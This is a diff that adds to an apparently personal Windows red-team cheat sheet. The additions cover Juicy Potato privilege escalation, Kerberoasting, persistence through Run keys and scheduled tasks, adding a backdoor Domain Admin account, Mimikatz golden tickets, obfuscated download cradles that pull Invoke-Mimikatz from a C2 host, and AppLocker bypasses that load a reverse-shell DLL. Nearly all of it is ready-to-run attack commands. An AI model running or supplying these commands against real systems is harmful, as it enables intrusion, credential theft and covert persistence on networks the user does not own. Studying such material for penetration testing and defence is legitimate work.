@@ -916,12 +916,16 @@ Juicy Potato
 
 #Reference https://ohpe.it/juicy-potato/
 
+Requirements: SeAssignPrimaryTokenPrivilege and/or SeImpersonatePrivilege
+
 (new-object System.Net.WebClient).DownloadFile('http://10.10.14.5:8000/JuicyPotato.exe','C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRESS\MSSQL\Backup\JuicyPotato.exe')
 
 JuicyPotato.exe -l 1337 -p C:\Users\Public\Documents\Mochan.exe -t * -c {5B3E6773-3A99-4A3D-8096-7765DD11785C}
 
 Mochan.exe = Payload
 5B3E6773-3A99-4A3D-8096-7765DD11785C = Target CLISD
+
+A CLSID is a GUID that identifies a COM class object
 
 Can also use -A flag to specify arguments alongside cmd.exe/powershell.exe etc
 
@@ -948,6 +952,30 @@ python GetUserSPNs.py -request -dc-ip 10.10.14.15 m0chanad.local/serviceaccount
 Ofc the above requires access to Port 88 on the DC but you can always port forward if executing GetUserSPNs.py manually.
 
 https://github.com/GhostPack/SharpRoast --NOW Deprecated-- and incorproated into Rebeus with the kerberoast action
+```
+
+
+
+Kerberoast with Python
+
+```powershell
+#https://github.com/skelsec/kerberoast
+
+
+IMPORTANT: the accepted formats are the following
+<ldap_connection_string> : <domainname>/<username>/<secret_type>:<secret>@<DC_ip>
+<kerberos_connection_string>: <kerberos realm>/<username>/<secret_type>:<secret>@<DC_ip>
+
+
+
+Look for vulnerable users via LDAP
+kerberoast ldap all <ldap_connection_string> -o ldapenum
+
+Use ASREP roast against users in the ldapenum_asrep_users.txt file
+kerberoast asreproast <DC_ip> -t ldapenum_asrep_users.txt
+
+Use SPN roast against users in the ldapenum_spn_users.txt file
+kerberoast spnroast <kerberos_connection_string> -t ldapenum_spn_users.txt
 ```
 
 
@@ -1103,6 +1131,18 @@ laZagne.exe browsers -firefox
 
 
 
+pypkatz
+
+```
+#https://github.com/skelsec/pypykatz
+
+Full python implementation of Mimikatz :D 
+
+pip3 install pypykatz
+```
+
+
+
 SafetyKatz
 
 ```powershell
@@ -1234,6 +1274,91 @@ SSH Shuttle
 ```
 
 
+
+AutoRun Registry
+
+```
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce]
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices]
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon]
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce]
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices]
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]
+[HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon]
+```
+
+
+
+Run & Run Once
+
+```
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate
+/t REG_SZ /d "C:\Temp\SoftwareUpdate\Malware.exe"
+```
+
+
+
+Scheduled Tasks
+
+```
+#Note - Beaware. some EDR/Endpoint Solutions detect Scheduled Tasks being created and trigger alerts.
+
+schtasks /create /sc minute /mo 1 /tn "Malware" /tr C:\Temp\SoftwareUpdate\Malware.exe
+
+This will run Malware.exe every minute forever.
+
+# Run Malware.exe every day at 06:00am
+schtasks /create /tn "SoftwareUpdate" /tr C:\Temp\SoftwareUpdate\Malware.exe /sc daily /st 06:00
+
+# Runs a task each time the user's session is idle for 5 minutes.
+schtasks /create /tn "SoftwareUpdate" /tr C:\Temp\SoftwareUpdate\Malware.exe /sc onidle /i 5
+
+# Runs a a task as SYSTEM when User Logs in.
+schtasks /create /ru "NT AUTHORITY\SYSTEM" /rp "" /tn "SoftwareUpdate" /tr C:\Temp\SoftwareUpdate\Malware.exe /sc onlogon
+```
+
+
+
+Windows Startup Folder 
+
+```
+This has been around for years as basically every version of Windows contains a startup folder. 
+
+Windows 10 - C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+```
+
+
+
+Add User Account
+
+```
+net user m0chan /add /domain
+net group "Domain Admins" m0chan /add /domain
+net localgroup "Administrators" /add
+net user m0chan /domain /comment:"Your Blueteam Fucking Sucks"
+```
+
+
+
+Persistence with Kerberos
+
+```
+We can dump Kerberos tickets and inject them in session when deemed relevant however tickets have a low life span unless explically requested for 7 days. 
+
+They can be injected into session with mimikatz or Rebeus. 
+
+But let's say we have pwned a DC and got the KRBTGT Hash we can generate a golden ticket with a 10 year life span.
+
+kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi /endin DATE
+
+Inject Ticket
+
+kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi
+```
 
 
 
@@ -1397,7 +1522,17 @@ We can now request TGS service tickets to access network resources as this user
 Invoke-Obfusaction
 
 ```powershell.exe
+#https://github.com/danielbohannon/Invoke-Obfuscation
 
+Can obfusacte Scripts & Commands 
+
+Obfusacte script from remote url 
+
+SET SCRIPTPATH https://thisdosentexist.m0chan.com/Invoke-Mimikatz.ps1
+
+Can also set Sscript block base64 PS
+
+SET SCRIPTBLOCK powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAWQBvAHUAIABjAGEAbgAgAHUAcwBlACAAYgBhAHMAaQBjACAALQBlAG4A==
 ```
 
 
@@ -1405,6 +1540,12 @@ Invoke-Obfusaction
 Invoke-CradleCraft
 
 ```
+#https://github.com/danielbohannon/Invoke-CradleCrafter
+
+Similar to Invoke-Obfusaction but allows you to obfusacte cradles for downloading i/e
+
+IEX (New-Object Net.WebClient).DownloadString('http://c2server.com/Invoke-Mimikatz.ps1')
+
 
 ```
 
@@ -1413,6 +1554,90 @@ Invoke-CradleCraft
 Invoke-DOSfuscation
 
 ```
+#https://github.com/danielbohannon/Invoke-DOSfuscation
+```
 
+
+
+## [](#header-2)AppLocker / Constrained Mode Bypasses
+
+
+
+Verify is you are in constrained mode
+
+```
+$ExecutionContext.SessionState.LanguageMode
+```
+
+
+
+PowershellVeryLess Bypass
+
+```powershell
+git clone https://github.com/decoder-it/powershellveryless.git
+
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll 
+/out:C:\Users\m0chan\Scripts\powershellveryless.exe 
+
+
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll /out:c:\setup\powershellveryless.exe c:\scripts\powershellveryless.cs
+
+
+Execute -> powershellveryless.exe script.ps1
+
+script.ps1 = Script of your Choice
+```
+
+
+
+World Writable Folders (By Default on Windows 10 1803) - Shoutout to api0cradle.
+
+```powershell
+#https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
+
+C:\Windows\Tasks 
+C:\Windows\Temp 
+C:\windows\tracing
+C:\Windows\Registration\CRMLog
+C:\Windows\System32\FxsTmp
+C:\Windows\System32\com\dmp
+C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
+C:\Windows\System32\spool\PRINTERS
+C:\Windows\System32\spool\SERVERS
+C:\Windows\System32\spool\drivers\color
+C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
+C:\Windows\SysWOW64\FxsTmp
+C:\Windows\SysWOW64\com\dmp
+C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
+C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
+```
+
+
+
+Downgrade Attack
+
+```powershell
+Downgrading to PS Version 2 circumvates AppLocker
+
+powershell.exe -version 2
+
+Verifiy versions with $PSVersionTable
+Get-Host
+```
+
+
+
+AppLocker COR Profile Bypass
+
+```
+set COR_ENABLE_PROFILING=1
+COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
+set COR_PROFILER_PATH=C:\Users\m0chan\pwn\reverseshell.dll
+tzsync
+powershell
+
+Where .DLL is your payload i/e reverse shell, beacon etc. 
 ```
 
